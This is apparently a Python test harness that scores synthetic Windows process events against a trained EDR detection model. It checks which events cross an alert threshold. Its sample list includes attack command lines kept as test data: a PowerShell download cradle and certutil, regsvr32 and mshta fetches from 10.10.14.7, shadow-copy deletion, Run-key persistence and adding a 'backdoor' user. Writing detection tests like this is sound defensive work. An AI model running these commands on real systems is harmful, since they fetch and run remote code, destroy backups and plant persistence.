import argparse
import sys

import joblib
import numpy as np
from agents.feature_extractor import ProcessFeatureExtractor

ALERT = 0.70
SYS32 = "C:\\WINDOWS\\system32"
PS = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
CMD = SYS32 + "\\cmd.exe"
USER = "WIN11\\vagrant"
HOME = "C:\\Users\\vagrant"
CHOCO = "C:\\ProgramData\\chocolatey\\bin"
GIT = "C:\\Program Files\\Git\\cmd\\git.exe"


def ev(name, path, command_line, parent, user=USER):
    return {
        "pid": 4242,
        "ppid": 4000,
        "name": name,
        "path": path,
        "command_line": command_line,
        "parent_name": parent,
        "user": user,
        "is_first_seen": False,
    }


SAMPLES = [
    ("benign  powershell (bare)", ev("powershell.exe", PS, f'"{PS}"', "WindowsTerminal.exe"), False),
    ("benign  powershell whoami", ev("powershell.exe", PS, f'"{PS}" -Command "whoami; exit"', "powershell.exe"), False),
    ("benign  cmd /c echo", ev("cmd.exe", CMD, f'"{CMD}" /c "echo hi & exit"', "powershell.exe"), False),
    ("benign  cmd /c dir", ev("cmd.exe", CMD, f"cmd /c dir {HOME}\\Documents", "explorer.exe"), False),
    ("benign  powershell Get-Volume", ev("powershell.exe", PS, 'powershell -Command "Get-Volume | Format-Table"', "explorer.exe"), False),
    ("benign  whoami", ev("whoami.exe", SYS32 + "\\whoami.exe", f'"{SYS32}\\whoami.exe"', "powershell.exe"), False),
    ("benign  svchost", ev("svchost.exe", SYS32 + "\\svchost.exe", f"{SYS32}\\svchost.exe -k GPSvcGroup", "services.exe", user="NT AUTHORITY\\SYSTEM"), False),
    ("attack  powershell encoded", ev("powershell.exe", PS, "powershell.exe -NoP -NonI -W Hidden -Enc " + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 5, "WINWORD.EXE"), True),
    ("attack  download cradle", ev("powershell.exe", PS, "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a.ps1')\"", "cmd.exe"), True),
    ("attack  certutil download", ev("certutil.exe", SYS32 + "\\certutil.exe", "certutil.exe -urlcache -split -f http://10.10.14.7/p.exe C:\\Users\\Public\\p.exe", "cmd.exe"), True),
    ("attack  regsvr32 scriptlet", ev("regsvr32.exe", SYS32 + "\\regsvr32.exe", "regsvr32 /s /n /u /i:http://10.10.14.7/x.sct scrobj.dll", "EXCEL.EXE"), True),
    ("attack  shadow copy delete", ev("vssadmin.exe", SYS32 + "\\vssadmin.exe", "vssadmin delete shadows /all /quiet", "cmd.exe"), True),
    ("attack  run-key persistence", ev("reg.exe", SYS32 + "\\reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /t REG_SZ /d C:\\Users\\Public\\u.exe /f", "cmd.exe"), True),
    ("attack  dropped exe in Temp", ev("x7k2q.exe", f"{HOME}\\AppData\\Local\\Temp\\x7k2q.exe", f"{HOME}\\AppData\\Local\\Temp\\x7k2q.exe", "WINWORD.EXE"), True),

    ("benign  Get-ChildItem user folder", ev("powershell.exe", PS, f'"{PS}" -Command "Get-ChildItem {HOME}"', "powershell.exe"), False),
    ("benign  cmd type user file", ev("cmd.exe", CMD, f'"{CMD}" /c "type {HOME}\\Desktop\\notes.txt"', "powershell.exe"), False),
    ("benign  chocolatey python --version", ev("python.exe", CHOCO + "\\python.exe", f'"{CHOCO}\\python.exe" --version', "powershell.exe"), False),
    ("benign  chocolatey python -c", ev("python.exe", CHOCO + "\\python.exe", f'"{CHOCO}\\python.exe" -c print(\'hello\')', "powershell.exe"), False),
    ("benign  git status", ev("git.exe", GIT, f'"{GIT}" -C Z:\\threat-defense-system status', "powershell.exe"), False),
    ("benign  schtasks /query", ev("schtasks.exe", SYS32 + "\\schtasks.exe", f'"{SYS32}\\schtasks.exe" /query /fo LIST', "powershell.exe"), False),
    ("benign  certutil -hashfile C:\\Sysmon", ev("certutil.exe", SYS32 + "\\certutil.exe", f'"{SYS32}\\certutil.exe" -hashfile C:\\Sysmon\\Sysmon.zip SHA256', "powershell.exe"), False),
    ("benign  VS Code (per-user install)", ev("Code.exe", f"{HOME}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", f'"{HOME}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"', "explorer.exe"), False),

    ("attack  dropped exe in Public", ev("svhost.exe", "C:\\Users\\Public\\svhost.exe", "C:\\Users\\Public\\svhost.exe -k", "powershell.exe"), True),
    ("attack  rundll32 dll in ProgramData", ev("rundll32.exe", SYS32 + "\\rundll32.exe", "rundll32.exe C:\\ProgramData\\a.dll,Start", "cmd.exe"), True),
    ("attack  mshta remote hta", ev("mshta.exe", SYS32 + "\\mshta.exe", "mshta http://10.10.14.7/a.hta", "OUTLOOK.EXE"), True),

    ("info    dropped exe in ProgramData root", ev("upd8.exe", "C:\\ProgramData\\upd8.exe", "C:\\ProgramData\\upd8.exe", "WINWORD.EXE"), None),
    ("info    net user /add", ev("net.exe", SYS32 + "\\net.exe", "net user backdoor P@ss1 /add", "cmd.exe"), None),
    ("info    certutil -hashfile in Downloads (benign)", ev("certutil.exe", SYS32 + "\\certutil.exe", f"certutil -hashfile {HOME}\\Downloads\\setup.zip SHA256", "powershell.exe"), None),
    ("info    Get-FileHash in Downloads (benign)", ev("powershell.exe", PS, f'powershell -Command "Get-FileHash {HOME}\\Downloads\\setup.zip"', "explorer.exe"), None),
    ("info    installer run from Downloads (benign)", ev("npp.8.6.Installer.x64.exe", f"{HOME}\\Downloads\\npp.8.6.Installer.x64.exe", f'"{HOME}\\Downloads\\npp.8.6.Installer.x64.exe"', "explorer.exe"), None),
]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--model-dir", default="data/models/EDR/windows")
    args = parser.parse_args()

    model = joblib.load(f"{args.model_dir}/process_model.pkl")
    scaler = joblib.load(f"{args.model_dir}/process_scaler.pkl")
    extractor = ProcessFeatureExtractor()
    positive = list(model.classes_).index(1)

    def score(event, first_seen):
        features = extractor.extract_features(dict(event, is_first_seen=first_seen))
        scaled = scaler.transform(np.array([list(features.values())]))
        return float(model.predict_proba(scaled)[0][positive])

    print("      seen    first-seen")
    failures = 0
    gated = 0
    for description, event, should_alert in SAMPLES:
        seen, first = score(event, False), score(event, True)
        if should_alert is None:
            print(f"[INFO] {seen:.4f}  {first:.4f}  {description}")
            continue
        gated += 1
        ok = all((value >= ALERT) == should_alert for value in (seen, first))
        failures += 0 if ok else 1
        print(f"{'PASS' if ok else 'FAIL'}  {seen:.4f}  {first:.4f}  {description}")

    print(f"\n{gated - failures}/{gated} passed (alert threshold {ALERT}, both first-seen values)")
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()